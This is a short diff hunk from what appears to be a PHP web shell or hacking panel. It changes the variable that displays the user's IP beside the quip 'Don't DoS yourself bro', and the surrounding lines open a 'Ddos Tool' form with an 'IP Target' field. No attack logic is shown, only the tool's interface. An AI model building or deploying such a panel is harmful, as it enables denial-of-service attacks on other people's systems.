@@ -3512,7 +3512,7 @@ target='_blank'>GET.KEY</font><br></tr></td></table></center>
 <html>
 <form action=" " method="post">
 <center><br><br><br>
-Your IP: <font color="Lavender"><b><?php echo $my_ip; ?></b></font>�(Don't DoS yourself bro)<br><br>
+Your IP: <font color="Lavender"><b><?php echo $ip; ?></b></font>�(Don't DoS yourself bro)<br><br>
 <table class="tabnet" style="width:333px;padding:0 1px;">
 <th colspan="5">Ddos Tool</th>
 <tr><tr><td>IP Target</td><td>:</td>
